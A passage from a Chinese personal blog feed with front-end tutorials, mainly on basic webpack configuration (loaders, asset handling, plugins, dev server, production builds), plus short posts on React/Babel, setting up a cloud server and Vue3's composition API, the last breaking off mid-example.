title="2.webpack的基本配置"></a>2.webpack的基本配置</h2><p>webpack有五大核心概念——entry(入口)，output(输出),loader(加载器-解析其他资源)，piugins(插件),mode(模式-生产模式和开发模式)</p><p>而webpack的配置文件都是建立在项目根目录下，叫做webpack.config.js的文件，里面就需要包含我们的五大核心概念</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">const path = require(&#x27;path&#x27;)//获取node.js的path模块</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    //入口</span><br><span class="line">    entry: &quot;./src/main.js&quot;,//相对路径</span><br><span class="line">    //输出</span><br><span class="line">    output: &#123;</span><br><span class="line">        //输出路径</span><br><span class="line">        //__dirname代表当前文件的文件夹目录的绝对路径</span><br><span class="line">        path: path.resolve(__dirname, &quot;dist&quot;),//当前目录下的dist文件夹</span><br><span class="line">        //文件名</span><br><span class="line">        filename: &quot;main.js&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    //加载器</span><br><span class="line">    module: &#123;</span><br><span class="line">        rules: [</span><br><span class="line">            //loader的配置</span><br><span class="line">        ],</span><br><span class="line">    &#125;,</span><br><span class="line">    //插件</span><br><span class="line">    plugins: [</span><br><span class="line">        //piugins的配置</span><br><span class="line">    ],</span><br><span class="line">    //模式</span><br><span class="line">    mode: &quot;development&quot;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，运行我们的webpack只需要<code>npx webpack</code>就可以运行我们的webpack了</p><h2 id="3-识别样式资源"><a href="#3-识别样式资源" class="headerlink" title="3.识别样式资源"></a>3.识别样式资源</h2><p>webpack本身只能识别js和json文件，那么如果想对样式资源进行打包，我们就需要下载各式各样的loader</p><h3 id="3-1识别css资源"><a href="#3-1识别css资源" class="headerlink" title="3.1识别css资源"></a>3.1识别css资源</h3><p>我们先看看官方文档中的做法</p><p><img src="https://s2.loli.net/2022/06/28/ONWuR5ftivQjDZH.png" alt="打包css.png"></p><p>我们首先建立一个.css文件，将css文件引入main.js中，按照官方文档的提示进行打包，需要注意的是：官方文档只安装了css-loader，但是实际上我们还需要安装style-loader</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//加载器</span><br><span class="line">module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">        //loader的配置</span><br><span class="line">        &#123;</span><br><span class="line">            test: /\.css$/i,//匹配.css文件</span><br><span class="line">            //执行顺序从右到左</span><br><span class="line">            use: [&quot;style-loader&quot;, &quot;css-loader&quot;],//css是将css转换为commonjs放入js，style是将js中的css转换为style标签中的内容</span><br><span class="line">        &#125;,</span><br><span class="line">    ],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="3-2-识别less，sass，styl资源"><a href="#3-2-识别less，sass，styl资源" class="headerlink" title="3.2 识别less，sass，styl资源"></a>3.2 识别less，sass，styl资源</h3><p>这四个资源和css资源类似，也需要下载loader，具体参考官方文档，loader的作用是将对应文件转换为css文件</p><p>下载完成后在config.js中的rules中加入新的对象即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//loader的配置</span><br><span class="line">&#123;</span><br><span class="line">    test: /\.css$/i,//匹配.css文件</span><br><span class="line">    //执行顺序从右到左</span><br><span class="line">    use: [&quot;style-loader&quot;, &quot;css-loader&quot;],//css是将css转换为commonjs放入js，style是将js中的css转换为style标签中的内容</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">    test: /\.less$/i,//匹配.less文件</span><br><span class="line">    //执行顺序从右到左</span><br><span class="line">    use: [&quot;style-loader&quot;, &quot;css-loader&quot;,&quot;less-loader&quot;], </span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">    test: /\.s[ac]ss$/i,//匹配.sass和.scss文件</span><br><span class="line">    //执行顺序从右到左</span><br><span class="line">    use: [&quot;style-loader&quot;, &quot;css-loader&quot;,&quot;sass-loader&quot;],</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">    test: /\.styl$/i,//匹配.styl文件</span><br><span class="line">    //执行顺序从右到左</span><br><span class="line">    use: [&quot;style-loader&quot;, &quot;css-loader&quot;,&quot;stylus-loader&quot;],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="4-处理图片"><a href="#4-处理图片" class="headerlink" title="4.处理图片"></a>4.处理图片</h2><p>webpack自带有处理图片的loader，所以我们不用下载</p><p>但是我们可以优化——（小于某个大小的图片可以转换为base64编码）</p><p>我们在rules中加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    test: /\.(png|jpe?g|gif|webp|svg)$/,</span><br><span class="line">    type: &#x27;asset&#x27;,</span><br><span class="line">   parser: &#123;</span><br><span class="line">     dataUrlCondition: &#123;</span><br><span class="line">        //小于10kb的图片会转base64</span><br><span class="line">       maxSize: 10 * 1024 // 10kb</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>代表小于10kb的图片会被打包成base64的编码，这样虽然图片的体积会变大，但是不用向服务器发送请求，减小了服务器的负担</p><h3 id="4-1修改文件输出目录"><a href="#4-1修改文件输出目录" class="headerlink" title="4.1修改文件输出目录"></a>4.1修改文件输出目录</h3><p>我们可以通过filename选项修改我们的输出文件的文件地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//文件名</span><br><span class="line">filename: &quot;static/js/main.js&quot;,</span><br></pre></td></tr></table></figure><p>这就是将main.js输出到了<code>dist/ststic/js/main.js</code></p><p>然后我们也可以通过添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">generator: &#123;</span><br><span class="line">    //输出图片地址名称</span><br><span class="line">    //hash值可以只取前十位</span><br><span class="line">    filename: &#x27;static/image/[hash:10][ext][query]&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改图片的输出路径</p><h2 id="5-处理字体图标文件"><a href="#5-处理字体图标文件" class="headerlink" title="5.处理字体图标文件"></a>5.处理字体图标文件</h2><p>webpack同样可以处理字体图标文件，并存放在指定目录下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    test: /\.(ttf|wff2?)$/,</span><br><span class="line">    //指定图片打包格式</span><br><span class="line">    type: &#x27;asset/resource&#x27;,</span><br><span class="line">    generator: &#123;</span><br><span class="line">        //输出图片地址名称</span><br><span class="line">        //hash值可以只取前十位</span><br><span class="line">        filename: &#x27;static/media/[hash:10][ext][query]&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>书写格式与图片类似</p><h2 id="6-处理HTML资源"><a href="#6-处理HTML资源" class="headerlink" title="6.处理HTML资源"></a>6.处理HTML资源</h2><p>处理html文件需要配置插件</p><p>使用<code>npm install --save-dev html-webpack-plugin </code>下载处理html的插件</p><p>在plugins中加入配置项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//引入html模块插件</span><br><span class="line">const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;);</span><br><span class="line"></span><br><span class="line">    //插件</span><br><span class="line">    plugins: [</span><br><span class="line">        //piugins的配置</span><br><span class="line">        new ESLintPlugin(&#123;</span><br><span class="line">            context: path.resolve(__dirname, &#x27;src&#x27;)</span><br><span class="line">        &#125;),</span><br><span class="line">        new HtmlWebpackPlugin(&#123;</span><br><span class="line">            //将/index.html加载到新的html文件中</span><br><span class="line">            //特点 1.有和原来文件一样的html结构 2.自动引入打包的文件</span><br><span class="line">            template: path.resolve(__dirname, &#x27;public/index.html&#x27;)</span><br><span class="line">        &#125;)</span><br><span class="line">    ],</span><br></pre></td></tr></table></figure><p>加入后进行编译，得到我们的dist目录下的html文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;webpack&lt;/title&gt;</span><br><span class="line">&lt;script defer src=&quot;static/js/main.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;hello webpack&lt;/h1&gt;</span><br><span class="line">    &lt;div class=&quot;box1&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;box2&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>我们发现不用引入script标签也可以出现相应的效果</p><h2 id="7-自动化"><a href="#7-自动化" class="headerlink" title="7.自动化"></a>7.自动化</h2><p>开发服务器帮助我们更改代码后，自动执行<code>npx webpack</code></p><p>首先安装这个开发服务器：<code>npm i webpack-dev-server -D</code></p><p>使用开发服务器是：<code>npx webpack serve</code></p><p>然后在config.js中加入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//开发服务器</span><br><span class="line">devServer: &#123;</span><br><span class="line">    host: &#x27;localhost&#x27;,//域名</span><br><span class="line">    port: &#x27;3000&#x27;,//端口号</span><br><span class="line">    open: true//是否打开服务器</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>之后我们更改代码只需要Ctrl+s保存就可以了</p><p>需要注意的是：我们的开发服务器不会把打包文件保存在dist目录下，而是保存在内存中。</p><h2 id="8-生产模式"><a href="#8-生产模式" class="headerlink" title="8.生产模式"></a>8.生产模式</h2><p>生产模式是用于将我们的代码打包部署上线的模式，生产模式的配置代码也需要一个文件保存</p><p>所以我们新建一个文件夹<code>config</code>用于存放配置文件，然后将两个配置文件放入<code>webpack.dev.js</code>和<code>webpack.prod.js</code></p><p>需要注意因为更改了文件目录，所以用到绝对路径的地方（有dirname）的地方需要改动，添加<code>../</code></p><p>而且webpack.prod.js中改为<code>mode:production</code></p><h3 id="8-1快捷方式"><a href="#8-1快捷方式" class="headerlink" title="8.1快捷方式"></a>8.1快捷方式</h3><p>我们使用生产模式下的webpack文件现在需要输入：<code>npx webpack --config .\config\webpack.prod.js</code></p><p>每次都需要输入这个十分麻烦，所以我们在package.json中修改生成快捷方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">  &quot;start&quot;: &quot;npx run dev&quot;,</span><br><span class="line">  &quot;dev&quot;: &quot;npx webpack --config .\\config\\webpack.dev.js&quot;,</span><br><span class="line">  &quot;build&quot;: &quot;npx webpack --config .\\config\\webpack.prod.js&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>以后我们生产模式下打包文件就只需要：<code>npm run build</code></p><h3 id="8-2-mini-css"><a href="#8-2-mini-css" class="headerlink" title="8.2 mini-css"></a>8.2 mini-css</h3><p>我们现在的css代码是打包到js文件中的，也就是解析js的时候才会生成<code>&lt;style&gt;</code>标签，然后在解析css样式</p><p>这样子就会出现<strong>闪屏</strong>现象，也就是css模块最后被加载导致页面闪一下，为了杜绝这种现象我们使用mini-css打包css文件</p><p>安装mini-css:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev mini-css-extract-plugin</span><br></pre></td></tr></table></figure><p>在prod.js中加入mini-css:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//引入mini-css模块</span><br><span class="line">const MiniCssExtractPlugin = require(&quot;mini-css-extract-plugin&quot;);</span><br><span class="line"></span><br><span class="line">//rules中loader的配置中将&quot;style.loader&quot;改为MiniCssExtractPlugin.loader</span><br><span class="line">&#123;</span><br><span class="line">    test: /\.css$/i,//匹配.css文件</span><br><span class="line">    //执行顺序从右到左</span><br><span class="line">    use: [MiniCssExtractPlugin.loader, &quot;css-loader&quot;],//css是将css转换为commonjs放入js，style是将js中的css转换为style标签中的内容</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">//在plugins中加入mini-css 并设置文件目录</span><br><span class="line">new MiniCssExtractPlugin(&#123;</span><br><span class="line">   filename:&#x27;static/css/main.css&#x27;</span><br><span class="line">&#125;)   </span><br></pre></td></tr></table></figure><p>最后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure><p>然后得到<code>dist/static/css</code>目录下的<code>main.css</code>文件</p><p><img src="https://s2.loli.net/2022/06/28/IBYRcLjmp65bha3.png" alt="mini-css.png"></p><p>现在加载css的时候就是通过link标签引入css了，就没有了闪屏现象</p><h3 id="8-3-打包loader"><a href="#8-3-打包loader" class="headerlink" title="8.3  打包loader"></a>8.3  打包loader</h3><p>loader中有大量重复的代码，我们打包loader成函数提高复用性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//pre就是我们less-loder等loader</span><br><span class="line">function getStyleLoader(pre) &#123;</span><br><span class="line">    return [MiniCssExtractPlugin.loader, &quot;css-loader&quot;,</span><br><span class="line">    &#123;</span><br><span class="line">        loader: &quot;postcss-loader&quot;,</span><br><span class="line">        options: &#123;</span><br><span class="line">            postcssOptions: &#123;</span><br><span class="line">                plugins: [</span><br><span class="line">                    &quot;postcss-preset-env&quot;//能解决大多数兼容性问题</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    pre,</span><br><span class="line">    ].filter(Boolean)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//less-loader中的演示</span><br><span class="line">&#123;</span><br><span class="line">   test: /\.less$/i,//匹配.less文件</span><br><span class="line">   //执行顺序从右到左</span><br><span class="line">   use: getStyleLoader(&quot;less-loader&quot;),</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="8-4-css压缩"><a href="#8-4-css压缩" class="headerlink" title="8.4 css压缩"></a>8.4 css压缩</h3><p>我们下载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install css-minimizer-webpack-plugin --save-dev</span><br></pre></td></tr></table></figure><p>然后在配置文件中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//压缩css</span><br><span class="line">const CssMinimizerPlugin = require(&quot;css-minimizer-webpack-plugin&quot;);</span><br><span class="line"></span><br><span class="line">//plugins中加入</span><br><span class="line">new CssMinimizerPlugin(),</span><br></pre></td></tr></table></figure><p>再重新打包，得到的main.css文件就是被压缩过的了</p><p>webpack的基本配置就是以上这些了！</p>]]></content>
    
    
    
    <tags>
      
      <tag>webpack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>react</title>
    <link href="/2022/06/20/React/"/>
    <url>/2022/06/20/React/</url>
    
    <content type="html"><![CDATA[<h1 id="React"><a href="#React" class="headerlink" title="React"></a>React</h1><h2 id="babel"><a href="#babel" class="headerlink" title="babel"></a>babel</h2><p>babel可以将ES6转换为ES5，但是babel远远不止于此，babel还可以将我们的react中的jsx转换为js代码</p>]]></content>
    
    
    
    <tags>
      
      <tag>react</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Own Server</title>
    <link href="/2022/06/16/%E4%B8%AA%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2022/06/16/%E4%B8%AA%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="个人服务器"><a href="#个人服务器" class="headerlink" title="个人服务器"></a>个人服务器</h1><p>建立个人服务器，大家就可以通过网络浏览你服务器中的内容。你也可以将自己的博客，网页搭到你的个人服务器上进行开发效果的检验。</p><h2 id="1-服务器初始化"><a href="#1-服务器初始化" class="headerlink" title="1.服务器初始化"></a>1.服务器初始化</h2><p>现在的云服务器有很多，除了BAT云外，还有华为云等等的云服务器。我所购买的是腾讯云，基本操作应该还是差不多的。</p><h2 id="1-1-查看服务器"><a href="#1-1-查看服务器" class="headerlink" title="1.1 查看服务器"></a>1.1 查看服务器</h2><p>在购买了服务器之后我们就查看我们的服务器了</p><p><img src="https://s2.loli.net/2022/06/20/zvZsq5MV2OneYAN.png" alt="查看服务器.png"></p><p>点击我们的服务器就可以看到很多基本信息</p><p><img src="https://s2.loli.net/2022/06/20/bOIAsiY4cjQ3gxk.png" alt="查看基本信息.png"></p><p>我们可以点击登录通过webshell操作我们的服务器</p>]]></content>
    
    
    
    <tags>
      
      <tag>服务器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue3</title>
    <link href="/2022/06/06/Vue3/"/>
    <url>/2022/06/06/Vue3/</url>
    
    <content type="html"><![CDATA[<h1 id="Vue3"><a href="#Vue3" class="headerlink" title="Vue3"></a>Vue3</h1><h2 id="1-创建一个vue3项目"><a href="#1-创建一个vue3项目" class="headerlink" title="1.创建一个vue3项目"></a>1.创建一个vue3项目</h2><h3 id="1-1cli创建"><a href="#1-1cli创建" class="headerlink" title="1.1cli创建"></a>1.1cli创建</h3><p>cli创建要求vue版本高于4.5.0，我们可以在cmd中通过<code>vue -V</code>查看</p><p>然后按照脚手架的方式创建：<code>vue create -name</code></p><p>进入之后选择vue3脚手架即可</p><h3 id="1-2-vite创建"><a href="#1-2-vite创建" class="headerlink" title="1.2 vite创建"></a>1.2 vite创建</h3><p>vite是新一代的前端构建工具，由vue团队开发，为了挑战webpack的地位</p><p>vite的速度更快更轻量级，使用vite构建工程的方法如下：</p><p><img src="D:\新建文件夹\文件\GitHub\pic\vue\vue3\vite.png" alt="vite"></p><p>启动不再是<code>npm run serve</code>而是<code>npm run dev</code></p><p>我们会发现启动快了很多，但是vite是<strong>等你进入网址再进行动态加载页面</strong></p><h2 id="2-vue3结构"><a href="#2-vue3结构" class="headerlink" title="2.vue3结构"></a>2.vue3结构</h2><p>vue3中的<code>main.js</code>中的代码和<code>vue2</code>不同，它使用一个轻量级的app管理组件，提供了挂载和卸载功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//引入调用vue的工厂函数 createApp</span><br><span class="line">import &#123; createApp &#125; from &#x27;vue&#x27;</span><br><span class="line">import App from &#x27;./App.vue&#x27;</span><br><span class="line"></span><br><span class="line">// 创建一个app对象，类似于vue2中的vm，但是app更轻</span><br><span class="line">const app = createApp(App)</span><br><span class="line"></span><br><span class="line">// 挂载</span><br><span class="line">app.mount(&#x27;#app&#x27;)</span><br><span class="line"></span><br><span class="line">// 卸载</span><br><span class="line">app.unmount(&#x27;#app&#x27;)</span><br></pre></td></tr></table></figure><p>在组件中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 可以不再需要一个根标签 --&gt;</span><br><span class="line">  &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;</span><br><span class="line">  &lt;HelloWorld msg=&quot;Welcome to Your Vue.js App&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><p>tips：我们可以使用#region和#endRegion括住注释的两端，实现折叠功能</p><h2 id="3-composition-API"><a href="#3-composition-API" class="headerlink" title="3.composition API"></a>3.composition API</h2><h3 id="3-1-set-up"><a href="#3-1-set-up" class="headerlink" title="3.1 set up"></a>3.1 set up</h3><p><code>set up</code>是一个配置项，它的值是一个函数，里面存放了数据，方法等（感觉有点像模块化的vuex）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">setup() &#123;</span><br><span class="line">  let name = &quot;tony&quot;;</span><br><span class="line">  let age = 18</span><br><span class="line"></span><br><span class="line">  function sayHello() &#123;</span><br><span class="line">    alert(`I am $&#123;name&#125;,I am $&#123;age&#125; years old`)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 在setup中数据需要return出去</span><br><span class="line">  return&#123;</span><br><span class="line">    name,</span><br><span class="line">    age,</span><br><span class="line">    sayHello</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>return出来的数据可以在外部调用，也可以<code>return</code>一个渲染函数<code>render</code></p><p>而且在模板中引用时需要使用this.xxx而不是xxx.value</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;我是App组件&lt;/h1&gt;</span><br><span class="line">&lt;h2&gt;person:&#123;&#123;this.name&#125;&#125; &#123;&#123;this.age&#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;button @click=&quot;sayHello&quot;&gt;hello&lt;/button&gt;</span><br></pre></td></tr></table></figure><p>注意set up 不要和vue2中的data，method混用，会有优先级的问题</p><p><strong>set up也不能是一个async函数</strong>，被async修饰后我们得到的就是一个promise包裹的对象了，所以被禁止了。</p><h3 id="3-2-ref"><a href="#3-2-ref" class="headerlink" title="3.2 ref"></a>3.2 ref</h3><p>ref在vue2中是一个属性，而在vue3中是一个函数，用于实现数据响应式</p><p>先引入ref</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123; ref &#125; from &quot;vue&quot;;</span><br></pre></td></tr></table></figure><p>为了实现ref，我们在定义数据时需要</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let name = ref(&quot;tony&quot;)</span><br><span class="line">let age = ref(18)</span><br></pre></td></tr></table></figure><p>这样ref将我们的数据转换成了一个对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RefImpl &#123;__v_isShallow: false, dep: Set(1), __v_isRef: true, _rawValue: &#x27;tony&#x27;, _value: &#x27;tony&#x27;&#125;</span><br><span class="line">dep: Set(1) &#123;ReactiveEffect&#125;</span><br><span class="line">__v_isRef: true</span><br><span class="line">__v_isShallow: false</span><br><span class="line">_rawValue:&quot; 李四&quot;</span><br><span class="line">_value: &quot;李四&quot;</span><br><span class="line">value: &quot;李四&quot;</span><br></pre></td></tr></table></figure><p>我们使用value值就可以调用setter，实现响应式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 设置响应式数据</span><br><span class="line">    function changeHello()&#123;</span><br><span class="line">      console.log(name);</span><br><span class="line">      name.value = &#x27;李四&#x27;,</span><br><span class="line">      age.value = 48 </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们还可以使用ref操作对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let job = ref(&#123;</span><br><span class="line">  type:&#x27;前端&#x27;,</span><br><span class="line">  salary:&#x27;30k&#x27;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>但是修改对象中的数据使用的是 <code>   job.value.salary=&#39;60k&#39;</code>，</p><p>因为对象的封装不再是refimpl，而是proxy</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Proxy</span><br><span class="line">[[Handler]]: Object</span><br><span class="line">[[Target]]: Object</span><br><span class="line">salary: &quot;60k&quot;</span><br><span class="line">type: &quot;前端&quot;</span><br><span class="line">[[Prototype]: Object</span><br><span class="line">[[IsRevoked]]: false</span><br></pre></td></tr></table></figure><h3 id="3-3-reactive"><a href="#3-3-reactive" class="headerlink" title="3.3 reactive"></a>3.3 reactive</h3><p>reactive适用于管理对象和数组类型的数据，但不能用于管理基本数据类型</p><p>也是将对象封装成一个proxy</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let job = reactive(&#123;</span><br><span class="line">  type:&#x27;前端&#x27;,</span><br><span class="line">  salary:&#x27;30k&#x27;</span><br><span 